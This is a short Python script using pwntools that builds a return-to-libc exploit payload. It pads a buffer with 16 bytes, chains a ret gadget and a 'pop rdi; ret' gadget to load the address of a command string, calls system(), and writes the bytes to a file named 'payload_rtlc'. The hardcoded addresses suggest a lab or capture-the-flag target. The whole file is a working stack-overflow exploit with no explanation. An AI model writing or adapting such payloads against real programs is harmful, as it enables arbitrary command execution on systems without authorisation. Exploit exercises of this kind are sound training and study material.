from pwn import *

gadget1 = 0x00401384 # ret
gadget2 = 0x00401383  # pop rdi; ret
command = 0x7fffff7575aa
system  = 0x7fffff5f5410
main_rip= 0x401311

data = b'a' * 16
data += p64(gadget1)
data += p64(gadget2)
data += p64(command)
data += p64(system)

f = open('payload_rtlc', 'wb')
f.write(data)
f.close()

